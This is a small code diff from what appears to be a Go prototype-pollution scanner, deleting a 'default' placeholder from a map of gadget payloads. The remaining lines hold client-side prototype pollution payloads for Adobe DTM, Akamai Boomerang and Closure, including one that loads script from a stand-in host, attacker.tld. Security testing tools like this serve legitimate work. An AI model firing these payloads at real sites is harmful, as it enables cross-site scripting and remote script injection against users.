@@ -94,7 +94,6 @@ var Fingerprint string = `(() => {
 // GadGets func
 func Gad(exp, resp, fullurl string) {
 	gadgetsPayloads := map[string]string{
-		"default":                       "No gadget found",
 		"Adobe Dynamic Tag Management":  "__proto__[src]data:,alert(1)//",
 		"Akamai Boomerang":              "__proto__[BOOMR]=1&__proto__[url]=//attacker.tld/js.js",
 		"Closure":                       "__proto__[CLOSURE_BASE_PATH]=data:,alert(1)//",
